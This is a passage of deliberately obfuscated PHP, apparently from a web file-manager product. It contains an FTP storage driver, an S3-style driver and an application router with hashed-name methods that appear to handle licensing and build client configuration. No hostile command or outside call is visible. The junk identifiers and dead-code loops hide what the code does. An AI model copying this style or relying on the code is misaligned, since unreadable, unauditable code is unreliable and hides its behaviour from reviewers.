($œ¦¨¥¨ú) { return $ÖßÁÓåœ; } $ÖßÁÓåœ[$ıÂ²ıüˆ[222]] = $ÖßÁÓåœ[$ıÂ²ıüˆ[88]] = 0; $ÖßÁÓåœ[$ıÂ²ıüˆ[223]] = $ÖßÁÓåœ[$ıÂ²ıüˆ[224]] = !0; $—¯õŸîŞ = $this->iconvSystem($Û´³ÜÈÎ); $ÖßÁÓåœ[$ıÂ²ıüˆ[88]] = @ftp_mdtm($this->connect, $—¯õŸîŞ); if (empty($ìİƒ‹Ûá)) { $ìİƒ‹Ûá = $this->objectMeta($Û´³ÜÈÎ); if (!$ìİƒ‹Ûá) { return $ÖßÁÓåœ; } } $ÖßÁÓåœ[$ıÂ²ıüˆ[79]] = $ìİƒ‹Ûá[$ıÂ²ıüˆ[79]]; return $ÖßÁÓåœ; } public function size($œ·­ñ‘) { $ã¥ùºš = $this->objectMeta($œ·­ñ‘); return $ã¥ùºš ? $ã¥ùºš[$_SERVER[º·Ï‹¥³][79]] : 0; } public function info($§‹êšñ) { if ($this->isFile($§‹êšñ)) { return $this->fileInfo($§‹êšñ, 0); } else { if ($this->isFolder($§‹êšñ)) { return $this->folderInfo($§‹êšñ); } } return !1; } private function fileList($êáãÖšÄ, &$“×´£êù, &$Ú âã–ö, $¯¿˜Ò® = false) { $öË˜ ğÓ =& $_SERVER[º·Ï‹¥³]; $êáãÖšÄ = $this->iconvSystem($êáãÖšÄ); if (!$this->isFolder($êáãÖšÄ)) { return !1; } @ftp_chdir($this->connect, $öË˜ ğÓ[8]); $êáãÖšÄ = rtrim($êáãÖšÄ, $öË˜ ğÓ[8]) . $öË˜ ğÓ[8]; check_abort(); $Øè‰ÒÍ = @ftp_rawlist($this->connect, $êáãÖšÄ); if (!$Øè‰ÒÍ) { $Øè‰ÒÍ = array(); } $›–¸ı“ü = array($öË˜ ğÓ[10] => 1, $öË˜ ğÓ[1331] => 1); foreach ($Øè‰ÒÍ as $ô²’‘«) { $ï¯À£Ç™ = $this->_listItem($ô²’‘«); if ($ï¯À£Ç™[0] == $öË˜ ğÓ[810]) { continue; } $ç²²×Ş² = $ï¯À£Ç™[8]; if (empty($ç²²×Ş²) && $ç²²×Ş² !== $öË˜ ğÓ[219] || isset($›–¸ı“ü[$ç²²×Ş²])) { continue; } $ç²²×Ş² = $this->iconvApp($êáãÖšÄ . ltrim($ç²²×Ş², $öË˜ ğÓ[8])); $ÌÏş¯º· = array($öË˜ ğÓ[32] => $ç²²×Ş², $öË˜ ğÓ[33] => $öË˜ ğÓ[221], $öË˜ ğÓ[79] => $ï¯À£Ç™[4]); if (substr($ô²’‘«, 0, 1) == $öË˜ ğÓ[1420]) { $ÌÏş¯º·[$öË˜ ğÓ[33]] = $öË˜ ğÓ[78]; $ÌÏş¯º·[$öË˜ ğÓ[79]] = 0; } $‘¶§Ş† = $ÌÏş¯º·[$öË˜ ğÓ[33]] == $öË˜ ğÓ[78] ? !0 : !1; $this->cacheMethodInfoSet($ç²²×Ş², $‘¶§Ş†, $ÌÏş¯º·); if ($‘¶§Ş†) { $“×´£êù[] = $ç²²×Ş²; if ($¯¿˜Ò®) { $this->fileList($ç²²×Ş², $“×´£êù, $Ú âã–ö, $¯¿˜Ò®); } continue; } $Ú âã–ö[] = $ÌÏş¯º·; } $this->cacheMethodInfoSet($êáãÖšÄ, !0); } private function _listItem($¾ĞÌĞƒ) { if (empty($¾ĞÌĞƒ)) { return array(); } $ê†¯‰ı = preg_split($_SERVER[º·Ï‹¥³][1421], $¾ĞÌĞƒ); if (count($ê†¯‰ı) <= 9) { return $ê†¯‰ı; } $ê†¯‰ı[8] = trim(substr($¾ĞÌĞƒ, strpos($¾ĞÌĞƒ, $ê†¯‰ı[7]) + strlen($ê†¯‰ı[7]))); return array_splice($ê†¯‰ı, 0, 9); } public function listPath($¨º‰Ùß÷, $ËÌØÀÍ¯ = false) { $ÊÈ¯º ˆ =& $_SERVER[º·Ï‹¥³]; if (!$this->_isconn()) { return !1; } $ïåÃ±ù‹ = $²Øø‹šø = array(); $this->fileList($¨º‰Ùß÷, $ïåÃ±ù‹, $²Øø‹šø); foreach ($ïåÃ±ù‹ as $öŒšóï¤ => $ÀâŠƒÁÀ) { $ïåÃ±ù‹[$öŒšóï¤] = $this->folderInfo($ÀâŠƒÁÀ, $ËÌØÀÍ¯); } foreach ($²Øø‹šø as $öŒšóï¤ => $ÀâŠƒÁÀ) { $²Øø‹šø[$öŒšóï¤] = $this->fileInfo($ÀâŠƒÁÀ[$ÊÈ¯º ˆ[32]], $ËÌØÀÍ¯, $ÀâŠƒÁÀ); } return array($ÊÈ¯º ˆ[85] => $ïåÃ±ù‹, $ÊÈ¯º ˆ[86] => $²Øø‹šø); } public function has($Š¦‘Æ¤æ, $×Êßİê = false, $ß€Ú´¶ = true) { $‘áË»ˆê =& $_SERVER[º·Ï‹¥³]; $ÆïØØ¾Ë = $¿æÜÆ€æ = array(); $£úª‹’¬ = $×Êßİê ? !0 : !1; $this->fileList($Š¦‘Æ¤æ, $ÆïØØ¾Ë, $¿æÜÆ€æ, $£úª‹’¬); if ($×Êßİê) { return array($‘áË»ˆê[230] => count($¿æÜÆ€æ), $‘áË»ˆê[231] => count($ÆïØØ¾Ë)); } if ($ß€Ú´¶) { if (count($¿æÜÆ€æ)) { return !0; } } else { if (count($ÆïØØ¾Ë)) { return !0; } } return !1; } public function listAll($±˜İ¹§„) { $ğ“ø•í =& $_SERVER[º·Ï‹¥³]; if (!$this->_isconn()) { return !1; } $Ñ™Ü£ = $Ë²³²…£ = array(); $this->fileList($±˜İ¹§„, $Ñ™Ü£, $Ë²³²…£, !0); $¹Àû¾Íê = array_to_keyvalue($Ë²³²…£, $ğ“ø•í[32]); foreach ($Ñ™Ü£ as $‚º»è®ù) { if (is_string($‚º»è®ù)) { $¹Àû¾Íê[$‚º»è®ù] = array($ğ“ø•í[79] => 0); } } return $this->listAllFiles($±˜İ¹§„, $¹Àû¾Íê); } public function getContent($Éì¶˜¼Ã) { if (!$this->_isconn()) { return !1; } $Éì¶˜¼Ã = $this->iconvSystem($Éì¶˜¼Ã); return $this->fileSubstr($Éì¶˜¼Ã); } public function setContent($ÓèšÈîß, $éÕåö€˜ = '') { if (!$this->_isconn()) { return !1; } $¿¦óŸªã = $this->pathThis($this->iconvSystem($ÓèšÈîß)); $à‹Û¦˜ = $this->tempFile($¿¦óŸªã); file_put_contents($à‹Û¦˜, $éÕåö€˜); $ú¿”¥†Ü = $this->upload($ÓèšÈîß, $this->iconvApp($à‹Û¦˜)); $this->tempFileRemve($à‹Û¦˜); return $ú¿”¥†Ü; } public function fileSubstr($èÚê««¨, $îşİî‹å = 0, $Ô¦ˆÚ¡– = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($èÚê««¨, $îşİî‹å, $Ô¦ˆÚ¡–); } private function ftpRequest($Ğñ¿ªÛÃ, $ÙˆÍéŒ = 0, $èÒ¢óçú = false) { $Ğñ¿ªÛÃ = $this->iconvSystem($Ğñ¿ªÛÃ); $¸¬±¬… = $this->scheme . $this->host . $_SERVER[º·Ï‹¥³][4] . $this->port; $»–è–„ˆ = curl_init(); curl_setopt($»–è–„ˆ, CURLOPT_URL, $¸¬±¬… . $this->pathEncode($Ğñ¿ªÛÃ)); curl_setopt($»–è–„ˆ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($èÒ¢óçú) { $†ŞĞ¡Ñ© = $ÙˆÍéŒ + $èÒ¢óçú - 1; curl_setopt($»–è–„ˆ, CURLOPT_RANGE, "{$ÙˆÍéŒ}\55{$†ŞĞ¡Ñ©}"); } curl_setopt($»–è–„ˆ, CURLOPT_RETURNTRANSFER, 1); $Â¿îŠä¦ = curl_exec($»–è–„ˆ); curl_close($»–è–„ˆ); return $Â¿îŠä¦; } public function upload($ñóõèøú, $Ş•ñœì , $šü½×§æ = false, $éÊ”æÖ´ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ñóõèøú))) { return !1; } $ñóõèøú = $this->iconvSystem($ñóõèøú); $Ş•ñœì  = $this->iconvSystem($Ş•ñœì ); $ßÂ‡Ÿå± = ftp_nb_put($this->connect, $ñóõèøú, $Ş•ñœì , FTP_BINARY); while ($ßÂ‡Ÿå± == FTP_MOREDATA) { $ßÂ‡Ÿå± = ftp_nb_continue($this->connect); } if ($ßÂ‡Ÿå± != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } return $this->getPathOuter($ñóõèøú); } public function download($ºæ´·°ä, $İ¿ÖáË = '') { if (!$this->_isconn()) { return !1; } $µëÈ³œ = $this->pathFather($İ¿ÖáË); if (!IO::mkdir($µëÈ³œ)) { return !1; } $ºæ´·°ä = $this->iconvSystem($ºæ´·°ä); $İ¿ÖáË = $this->iconvSystem($İ¿ÖáË); $ƒîÚ—Ÿ† = ftp_nb_get($this->connect, $İ¿ÖáË, $ºæ´·°ä, FTP_BINARY); while ($ƒîÚ—Ÿ† == FTP_MOREDATA) { $ƒîÚ—Ÿ† = ftp_nb_continue($this->connect); } if ($ƒîÚ—Ÿ† != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } return $this->iconvApp($İ¿ÖáË); } public function exist($€ô•§Ô) { return $this->isFile($€ô•§Ô) || $this->isFolder($€ô•§Ô); } public function isFile($üî”ëãø) { return !$this->isFolder($üî”ëãø) && $this->objectMeta($üî”ëãø); } public function isFolder($—æ›Ã¢…) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][169], $—æ›Ã¢…); } protected function objectMeta($Ô¾åÍ) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][171], $Ô¾åÍ); } protected function _objectMeta($Ê¶îêŒ°) { $’¢¯„àÏ =& $_SERVER[º·Ï‹¥³]; if ($Ê¶îêŒ° == $’¢¯„àÏ[12] || $Ê¶îêŒ° == $’¢¯„àÏ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ê¶îêŒ° = $this->iconvSystem($Ê¶îêŒ°); $‹èŠü• = array($’¢¯„àÏ[32] => $this->iconvApp($Ê¶îêŒ°), $’¢¯„àÏ[33] => $’¢¯„àÏ[221], $’¢¯„àÏ[79] => 0); @ftp_chdir($this->connect, $’¢¯„àÏ[8]); $˜Ç’Œù˜ = @ftp_size($this->connect, $Ê¶îêŒ°); if ($˜Ç’Œù˜ != -1) { $‹èŠü•[$’¢¯„àÏ[79]] = $˜Ç’Œù˜; } else { $Šä­ùƒ = @ftp_chdir($this->connect, $Ê¶îêŒ°); if (!$Šä­ùƒ) { return !1; } $‹èŠü•[$’¢¯„àÏ[33]] = $’¢¯„àÏ[78]; } return $‹èŠü•; } protected function _isFolder($ôÙ¸Ğæ›) { $ÍëéˆûÂ =& $_SERVER[º·Ï‹¥³]; if ($ôÙ¸Ğæ› == $ÍëéˆûÂ[12] || $ôÙ¸Ğæ› == $ÍëéˆûÂ[8]) { return !0; } $»›±ãÂÍ = $this->_objectMeta($ôÙ¸Ğæ›); return isset($»›±ãÂÍ[$ÍëéˆûÂ[33]]) && $»›±ãÂÍ[$ÍëéˆûÂ[33]] == $ÍëéˆûÂ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($³Å‘×»…) { parent::__construct($³Å‘×»…); $this->setSignVersion($_SERVER[º·Ï‹¥³][238]); } public function uploadLink($†ıÎû¡, $£¯°‹É = 0) { $Şæã«ÖÕ =& $_SERVER[º·Ï‹¥³]; if ($this->isUploadServer()) { return; } $ßºŠôĞº = $this->getType(); if (!in_array($ßºŠôĞº, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ùßˆ˜ôˆ = (!$£¯°‹É ? 1 : ceil($£¯°‹É / pow(1024, 3))) * 3600 * 4; $¹ë³ªÑ  = $this->multiUploadFormData($†ıÎû¡, $Ùßˆ˜ôˆ); if ($¹ë³ªÑ ) { $¹ë³ªÑ [$Şæã«ÖÕ[97]] = $†ıÎû¡; $¹ë³ªÑ [$Şæã«ÖÕ[98]] = $ßºŠôĞº; } return $¹ë³ªÑ ; } public function fileOutImage($ÂíÖ‹µƒ, $€»¨ØÊ = 250) { if ($this->size($ÂíÖ‹µƒ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÂíÖ‹µƒ, $€»¨ØÊ); } $ÓÕÛ¹¿Ğ = $this->link($ÂíÖ‹µƒ); $ÓÕÛ¹¿Ğ .= $_SERVER[º·Ï‹¥³][1422] . $€»¨ØÊ; $this->fileOutLink($ÓÕÛ¹¿Ğ); } public function fileOutLink($ÎšĞ‚œŸ) { $§ñË›·¸ =& $_SERVER[º·Ï‹¥³]; if (substr($ÎšĞ‚œŸ, 0, 7) == $§ñË›·¸[1377]) { $ÎšĞ‚œŸ = $§ñË›·¸[1378] . substr($ÎšĞ‚œŸ, 7); } header($§ñË›·¸[165] . $ÎšĞ‚œŸ); die; } } goto cğÂÂÚœœ; F»‡¤°•æÚ: class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\151\x6e\144\145\170"; function __construct() { } public function setDefault($Úë­ïÄ) { $°æŞÆÕ“ =& $_SERVER[º·Ï‹¥³]; $°¾Œº° =& $_SERVER[€ÔÇñ¨ø]; $ºè‚ê¯ú = explode($°¾Œº°[0], trim($Úë­ïÄ, $°¾Œº°[0])); $this->defaultModule = $ºè‚ê¯ú[0] ? $ºè‚ê¯ú[0] : $this->defaultModule; $this->defaultController = $ºè‚ê¯ú[1] ? $ºè‚ê¯ú[1] : $this->defaultController; $Ì­€ÇÛÍ = $°æŞÆÕ“[667]; if (!$Ì­€ÇÛÍ) { return; } $this->defaultAction = $ºè‚ê¯ú[2] ? $ºè‚ê¯ú[2] : $this->defaultAction; $™òĞ´‚– = $°æŞÆÕ“[668]; if (!$™òĞ´‚–) { die; } $this->akswc10aed7f($°¾Œº°[1], array($this, $°¾Œº°[2])); $¬¥é¯‹ = $°æŞÆÕ“[669]; if (strlen($¬¥é¯‹) < $°æŞÆÕ“[412]) { return; } } public function appRun($¤Ç¥¨“Í) { $Ú°ı’¥Š =& $_SERVER[º·Ï‹¥³]; $‚İ´Ÿ×« =& $_SERVER[€ÔÇñ¨ø]; $­ıŒóÏ = explode($‚İ´Ÿ×«[0], $¤Ç¥¨“Í); $šñ£È´ = strtolower($­ıŒóÏ[0]); $şõ°Ò¿’ = $‚İ´Ÿ×«[3]; $Ïé¿ìÈæ = $Ú°ı’¥Š[670]; if ($šñ£È´ == $‚İ´Ÿ×«[4]) { $şõ°Ò¿’ = $‚İ´Ÿ×«[5]; $­ıŒóÏ[0] = $‚İ´Ÿ×«[6]; $­ıŒóÏ[1] = $­ıŒóÏ[1] . $‚İ´Ÿ×«[7]; $¤Ç¥¨“Í = join($‚İ´Ÿ×«[0], $­ıŒóÏ); $¤Ç¥¨“Í = trim($¤Ç¥¨“Í, $‚İ´Ÿ×«[0]); } call_user_func(array($‚İ´Ÿ×«[8], $‚İ´Ÿ×«[9]), $şõ°Ò¿’ . $‚İ´Ÿ×«[10], $¤Ç¥¨“Í); ActionCall($¤Ç¥¨“Í); call_user_func(array($‚İ´Ÿ×«[8], $‚İ´Ÿ×«[9]), $şõ°Ò¿’ . $‚İ´Ÿ×«[11], $¤Ç¥¨“Í); $‡º­¢œ” = $Ú°ı’¥Š[671]; if (strlen($‡º­¢œ”) < $Ú°ı’¥Š[672]) { return; } } private function autorun() { $ØÕê‹ÜÓ =& $_SERVER[€ÔÇñ¨ø]; global $config; if (count($config[$ØÕê‹ÜÓ[12]]) == 0) { return; } foreach ($config[$ØÕê‹ÜÓ[12]] as $Ğµêíâ‰ => $µë©–¯) { $this->appRun($µë©–¯); $•üÉŠ—° = $_SERVER[º·Ï‹¥³][673]; } } private function ahzp71a84731() { $’¥ı³£Ô =& $_SERVER[º·Ï‹¥³]; $€°”„’ =& $_SERVER[€ÔÇñ¨ø]; $ë§İÚÆ = $€°”„’[4]; $èŸïí»À = $GLOBALS[$€°”„’[13]][$€°”„’[14]][0]; $¶©ù—©î = $’¥ı³£Ô[674]; if (!$¶©ù—©î) { return; } if (!$èŸïí»À || strlen($èŸïí»À) <= strlen($ë§İÚÆ)) { return; } if (strtolower(substr($èŸïí»À, -strlen($ë§İÚÆ))) != $ë§İÚÆ) { return; } $÷Í†Á“‹ = substr($èŸïí»À, 0, -strlen($ë§İÚÆ)); $ƒø‘‹¹• = $’¥ı³£Ô[675]; while (strlen($ƒø‘‹¹•) < $’¥ı³£Ô[676]) { if (!$ƒø‘‹¹•) { break; } $ƒø‘‹¹•++; } $Øıê¯ = array($€°”„’[4], $÷Í†Á“‹); $­¦¨¦Âª = array_slice($GLOBALS[$€°”„’[13]][$€°”„’[14]], 1); $GLOBALS[$€°”„’[13]][$€°”„’[14]] = array_merge($Øıê¯, $­¦¨¦Âª); $•ƒ¦áÓ÷ = $’¥ı³£Ô[677]; while ($•ƒ¦áÓ÷ < $’¥ı³£Ô[676]) { if ($•ƒ¦áÓ÷ >= 0) { break; } $•ƒ¦áÓ÷++; } $GLOBALS[$€°”„’[13]][$€°”„’[15]] = implode($€°”„’[0], $GLOBALS[$€°”„’[13]][$€°”„’[14]]); } private function gows182cc8cf() { $ÖòîÕ®† =& $_SERVER[º·Ï‹¥³]; $Ø¤Û ´¡ =& $_SERVER[€ÔÇñ¨ø]; if ($GLOBALS[$Ø¤Û ´¡[13]][$Ø¤Û ´¡[15]] != $Ø¤Û ´¡[6]) { return; } $×½ÆÕ£ó = $_SERVER[$Ø¤Û ´¡[16]]; $ÊÊ«ã£ = $ÖòîÕ®†[678]; if (strlen($ÊÊ«ã£) < $ÖòîÕ®†[672]) { die; } $ÜŞŠ•õŸ = $Ø¤Û ´¡[17]; $ÒÊú«Ø = $ÖòîÕ®†[679]; if (!$ÒÊú«Ø) { return; } if (!strstr($×½ÆÕ£ó, $ÜŞŠ•õŸ)) { return; } $‰Ğ¾»…© = strrpos($×½ÆÕ£ó, $ÜŞŠ•õŸ); $¡ÙäÅ©¼ = substr($×½ÆÕ£ó, $‰Ğ¾»…© + strlen($ÜŞŠ•õŸ)); $ùğ€ä† = $ÖòîÕ®†[680]; while (strlen($ùğ€ä†) < $ÖòîÕ®†[676]) { if (!$ùğ€ä†) { break; } $ùğ€ä†++; } preg_match_all($Ø¤Û ´¡[18], $¡ÙäÅ©¼, $ÇÚÊƒè); $¡ÙäÅ©¼ = trim($ÇÚÊƒè[0][0], $Ø¤Û ´¡[19]); $GLOBALS[$Ø¤Û ´¡[13]][$Ø¤Û ´¡[14]] = explode($Ø¤Û ´¡[19], $¡ÙäÅ©¼); $GLOBALS[$Ø¤Û ´¡[13]][$Ø¤Û ´¡[15]] = implode($Ø¤Û ´¡[0], $GLOBALS[$Ø¤Û ´¡[13]][$Ø¤Û ´¡[14]]); $ıõµßáÚ = $ÖòîÕ®†[681]; } public function run() { $°âŒš¨ª =& $_SERVER[º·Ï‹¥³]; $ÎÒÅ€Ï =& $_SERVER[€ÔÇñ¨ø]; $this->gows182cc8cf(); $this->ahzp71a84731(); $­‹Ï¦Â« = $GLOBALS[$ÎÒÅ€Ï[13]][$ÎÒÅ€Ï[14]]; $Ô¤Äœ¨ = $°âŒš¨ª[682]; if (strlen($Ô¤Äœ¨) < $°âŒš¨ª[672]) { return; } $¥áË Ò‹ = $GLOBALS[$ÎÒÅ€Ï[13]][$ÎÒÅ€Ï[15]]; $‰ûÒˆÂ„ = $°âŒš¨ª[683]; if (!$‰ûÒˆÂ„) { return; } define($ÎÒÅ€Ï[20], isset($­‹Ï¦Â«[0]) && $­‹Ï¦Â«[0] ? $­‹Ï¦Â«[0] : $this->defaultModule); define($ÎÒÅ€Ï[21], isset($­‹Ï¦Â«[1]) && $­‹Ï¦Â«[0] ? $­‹Ï¦Â«[1] : $this->defaultController); $ şğ˜© = $°âŒš¨ª[684]; define($ÎÒÅ€Ï[22], isset($­‹Ï¦Â«[2]) && $­‹Ï¦Â«[0] ? $­‹Ï¦Â«[2] : $this->defaultAction); define($ÎÒÅ€Ï[23], MOD . $ÎÒÅ€Ï[0] . ST . $ÎÒÅ€Ï[0] . ACT); $İˆ€œµá = $°âŒš¨ª[685]; if (strlen($İˆ€œµá) < $°âŒš¨ª[676]) { die; } $_SERVER[$ÎÒÅ€Ï[24]] = strtolower(ACTION); $this->autorun(); if (count($­‹Ï¦Â«) >= 3) { $this->appRun($¥áË Ò‹); } else { $this->appRun(ACTION); } } private $oged17bba83b = array(); private $hbeqc5dc2903 = ''; public function rmoa02c22634() { $ë«¼Æ¯‹ =& $_SERVER[º·Ï‹¥³]; $Å—¬¨Ãå =& $_SERVER[€ÔÇñ¨ø]; $this->lxvye9f5c37f(); $®óø‹Ë = $ë«¼Æ¯‹[686]; while ($®óø‹Ë < $ë«¼Æ¯‹[412]) { if ($®óø‹Ë >= 0) { break; } $®óø‹Ë++; } $this->okxz5abf0478(); $™Ö‡æ‚² = $ë«¼Æ¯‹[687]; $this->zqxpacf7fe71(); $Ã¾‡´·§ = $ë«¼Æ¯‹[688]; $this->zgtnbe65a103(); $this->cqdw6e16c9ab(); $this->smhuc7009afe(); $this->cqbo482b6eb6(); $this->akswc10aed7f($Å—¬¨Ãå[25], array($this, $Å—¬¨Ãå[26])); $this->akswc10aed7f($Å—¬¨Ãå[27], array($this, $Å—¬¨Ãå[28])); $Ö†¥Ã—ì = $ë«¼Æ¯‹[689]; if (!$Ö†¥Ã—ì) { die; } $this->akswc10aed7f($Å—¬¨Ãå[29], array($this, $Å—¬¨Ãå[30])); $ˆ‡±äÊ = $ë«¼Æ¯‹[690]; if (strlen($ˆ‡±äÊ) < $ë«¼Æ¯‹[691]) { die; } $this->akswc10aed7f($Å—¬¨Ãå[31], array($this, $Å—¬¨Ãå[32])); $¬çš¹‰ = $ë«¼Æ¯‹[692]; if (strlen($¬çš¹‰) < $ë«¼Æ¯‹[672]) { return; } } public function qvzle71e997f($ÈÆ˜ÛİÈ) { $âæÓ«Æ =& $_SERVER[º·Ï‹¥³]; $¹ä ÇÖ½ =& $_SERVER[€ÔÇñ¨ø]; $™ığş­Ó = Model($¹ä ÇÖ½[33])->get(); $šÊ²‡‚Î = array($¹ä ÇÖ½[34], $¹ä ÇÖ½[35], $¹ä ÇÖ½[36], $¹ä ÇÖ½[37], $¹ä ÇÖ½[38], $¹ä ÇÖ½[39], $¹ä ÇÖ½[40], $¹ä ÇÖ½[41], $¹ä ÇÖ½[42], $¹ä ÇÖ½[43], $¹ä ÇÖ½[44], $¹ä ÇÖ½[45], $¹ä ÇÖ½[46], $¹ä ÇÖ½[47], $¹ä ÇÖ½[48], $¹ä ÇÖ½[49], $¹ä ÇÖ½[50], $¹ä ÇÖ½[51], $¹ä ÇÖ½[52], $¹ä ÇÖ½[53], $¹ä ÇÖ½[54], $¹ä ÇÖ½[55], $¹ä ÇÖ½[56], $¹ä ÇÖ½[57], $¹ä ÇÖ½[58], $¹ä ÇÖ½[59], $¹ä ÇÖ½[60], $¹ä ÇÖ½[61], $¹ä ÇÖ½[62], $¹ä ÇÖ½[63], $¹ä ÇÖ½[64], $¹ä ÇÖ½[65], $¹ä ÇÖ½[66], $¹ä ÇÖ½[67], $¹ä ÇÖ½[68], $¹ä ÇÖ½[69], $¹ä ÇÖ½[70], $¹ä ÇÖ½[71], $¹ä ÇÖ½[72], $¹ä ÇÖ½[73], $¹ä ÇÖ½[74], $¹ä ÇÖ½[75], $¹ä ÇÖ½[76], $¹ä ÇÖ½[77], $¹ä ÇÖ½[78], $¹ä ÇÖ½[79], $¹ä ÇÖ½[80], $¹ä ÇÖ½[81], $¹ä ÇÖ½[82], $¹ä ÇÖ½[83], $¹ä ÇÖ½[84]); foreach ($šÊ²‡‚Î as $€­ÚÃ¼™) { $ºÓ£¹–› = $GLOBALS[$¹ä ÇÖ½[85]][$¹ä ÇÖ½[86]][$€­ÚÃ¼™]; $Å¬°Ÿµ = $âæÓ«Æ[693]; if (!$Å¬°Ÿµ) { die; } if (isset($™ığş­Ó[$€­ÚÃ¼™])) { $ºÓ£¹–› = $™ığş­Ó[$€­ÚÃ¼™]; } $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[88]][$€­ÚÃ¼™] = $ºÓ£¹–›; } $úô†Ô ­ = $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[88]][$¹ä ÇÖ½[46]]; unset($ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[89]][$¹ä ÇÖ½[90]]); $ªß‰Èà‚ = $âæÓ«Æ[694]; if (strlen($ªß‰Èà‚) < $âæÓ«Æ[412]) { die; } unset($ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[89]][$¹ä ÇÖ½[91]]); unset($ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[88]][$¹ä ÇÖ½[46]]); $óÍØì¶æ = $âæÓ«Æ[695]; if (!$óÍØì¶æ) { return; } unset($ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[88]][$¹ä ÇÖ½[92]]); $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[88]][$¹ä ÇÖ½[93]] = array($¹ä ÇÖ½[94] => (int) $úô†Ô ­[$¹ä ÇÖ½[95]], $¹ä ÇÖ½[96] => (int) _get($úô†Ô ­, $¹ä ÇÖ½[97], 0)); $¬©ÄÌ¨÷ = substr(md5($¹ä ÇÖ½[98] . get_client_ip() . $™ığş­Ó[$¹ä ÇÖ½[99]]), 0, 15); $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[101]] = Mcrypt::encode(Session::sign(), $¬©ÄÌ¨÷, 3600 * 24); $öäü­¹ş = $âæÓ«Æ[696]; while ($öäü­¹ş < $âæÓ«Æ[691]) { if ($öäü­¹ş >= 0) { break; } $öäü­¹ş++; } $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[102]] = Action($¹ä ÇÖ½[103])->accessToken(); $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[104]] = md5($_SERVER[$¹ä ÇÖ½[105]] . $™ığş­Ó[$¹ä ÇÖ½[99]]); $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[106]] = base64_encode(serverInfo()); $ÖÛé¡Üµ = $âæÓ«Æ[697]; if (!$ÖÛé¡Üµ) { return; } $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[107]] = $this->hbeqc5dc2903; $èìáÙÜ¤ = $âæÓ«Æ[698]; while ($èìáÙÜ¤ < $âæÓ«Æ[691]) { if ($èìáÙÜ¤ >= 0) { break; } $èìáÙÜ¤++; } if ($™ığş­Ó[$¹ä ÇÖ½[107]] != $¹ä ÇÖ½[108]) { $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[109]] = $™ığş­Ó[$¹ä ÇÖ½[109]]; $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[110]] = $™ığş­Ó[$¹ä ÇÖ½[110]]; $ŠÃåÎ­² = rand_string(10) . $this->hbeqc5dc2903 . rand_string(5); $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[111]][$¹ä ÇÖ½[112]] = $this->qamef6a6ceac($ŠÃåÎ­², $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[104]]); } if ($this->hbeqc5dc2903 == $¹ä ÇÖ½[108]) { $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[87]][$¹ä ÇÖ½[88]][$¹ä ÇÖ½[93]][$¹ä ÇÖ½[97]] = 0; } $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[113]] = $this->versionPluginFilter(); $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[114]] = _get($this->oged17bba83b, $¹ä ÇÖ½[115], $¹ä ÇÖ½[6]); $ûìè ê„ = $âæÓ«Æ[699]; if (strlen($ûìè ê„) < $âæÓ«Æ[676]) { die; } if (KodUser::isRoot() && $this->config[$¹ä ÇÖ½[116]]) { $ÈÆ˜ÛİÈ[$¹ä ÇÖ½[100]][$¹ä ÇÖ½[117]] = WEB_ROOT; } return $ÈÆ˜ÛİÈ; } private function smhuc7009afe() { $ñÓ·ª¶ =& $_SERVER[º·Ï‹¥³]; $úÜÒêÙÍ =& $_SERVER[€ÔÇñ¨ø]; $Õ…®ÍÑ = $_SERVER[$úÜÒêÙÍ[24]] == $úÜÒêÙÍ[118]; if ($_SERVER[$úÜÒêÙÍ[24]] == $úÜÒêÙÍ[119] && $_GET[$úÜÒêÙÍ[120]] == $úÜÒêÙÍ[121]) { $Õ…®ÍÑ = !0; } if ($Õ…®ÍÑ) { $ä¶µù€„ = array($úÜÒêÙÍ[107] => $this->hbeqc5dc2903, $úÜÒêÙÍ[122] => $this->lgfz57cb0b47(), $úÜÒêÙÍ[123] => Model($úÜÒêÙÍ[124])->count()); if ($this->hbeqc5dc2903 != $úÜÒêÙÍ[108]) { $¬ÏùÀô = _get($this->oged17bba83b, $úÜÒêÙÍ[125]); if ($¬ÏùÀô) { $ä¶µù€„[$úÜÒêÙÍ[126]] = $¬ÏùÀô; $ä¶µù€„[$úÜÒêÙÍ[127]] = strtotime(_get($this->oged17bba83b, 